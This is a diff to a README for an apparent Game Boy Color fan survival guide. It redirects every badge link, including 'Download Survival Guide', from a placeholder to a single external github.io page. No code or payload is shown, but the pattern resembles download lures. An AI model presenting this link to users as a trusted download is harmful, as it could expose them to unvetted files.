@@ -4,10 +4,10 @@
 
 ---
 
-[![Download Guide](https://img.shields.io/badge/⬇️_Download_Survival_Guide-blueviolet?style=for-the-badge)](#)
+[![Download Guide](https://img.shields.io/badge/⬇️_Download_Survival_Guide-blueviolet?style=for-the-badge)](https://survival-kids-secrets.github.io/.github)
 
-[![Platform](https://img.shields.io/badge/Platform-Game_Boy_Color-green?style=flat-square)](#)  
-[![Type](https://img.shields.io/badge/Type-Fan_Guide-lightgrey?style=flat-square)](#)
+[![Platform](https://img.shields.io/badge/Platform-Game_Boy_Color-green?style=flat-square)](https://survival-kids-secrets.github.io/.github)  
+[![Type](https://img.shields.io/badge/Type-Fan_Guide-lightgrey?style=flat-square)](https://survival-kids-secrets.github.io/.github)
 
 ---
 
